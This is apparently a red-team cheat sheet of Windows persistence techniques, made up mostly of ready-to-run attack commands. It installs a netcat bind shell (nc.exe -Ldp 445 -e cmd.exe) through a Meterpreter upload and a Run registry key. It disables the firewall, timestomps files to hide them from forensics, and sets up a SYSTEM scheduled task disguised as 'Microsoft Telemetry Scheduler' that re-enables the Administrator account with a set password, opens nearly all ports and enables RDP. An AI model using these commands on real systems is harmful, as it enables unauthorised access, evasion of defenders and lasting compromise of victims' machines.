# Windows Persistence

**Tips for staying persistent on Windows (Austin Pabst)**

Post exploit netcat Backdoor:

Open meterpreter >
- `upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32`
- `reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run`
- `reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'`
- `reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc`
- `execute -f cmd -i`

`C:Windows\system32>`
- `netsh advfirewall set allprofiles state off`
- `netsh advfirewall show allprofiles`
- `netsh advfirewall firewall add rule name="Open Port 445" dir=in action=allow protocol=TCP localport=445`
- `netsh firewall show port`
- `Shutdown -r -t 0`

Open New Terminal
- `nc -v 10.0.x.8 445`

***might work might not***

## Time Stomp in Meterpreter

Credit to Jesse More

This is how you TimeStomp a Windows mahcine with Metasploit Meterpreter.

Check the time stamp of file
`meterpreter> timestomp YOURFILE.exe -v`

Change the time to the CMD.exe time
`meterpreter> timestomp YOURFILE.exe -f C:\\WINNT\\system32\\cmd.exe`

Then validate:
`meterpreter> timestomp YOURFILE.exe -v`

Reference: 
https://www.offensive-security.com/metasploit-unleashed/TimeStomp/


## remote.ps1

(Carl Pearson - INL)

Assuming admin priviliges on compromised host, you can set this script to run at a regular interval to:
- Re-enable the built-in Administrator account (password r3dt34m)
- Allow inbound/outbound TCP/UDP ports 1-64000
- Enable RDP connections

Can run as a scheduled task or however you prefer. For example, running every 5 minutes through Task Scheduler task:

`schtasks /create /ru "NT AUTHORITY\SYSTEM" /tn "Microsoft Telemetry Scheduler" /tr "powershell.exe -executionpolicy bypass C:\path\to\remote.ps1" /sc MINUTE /mo 5`
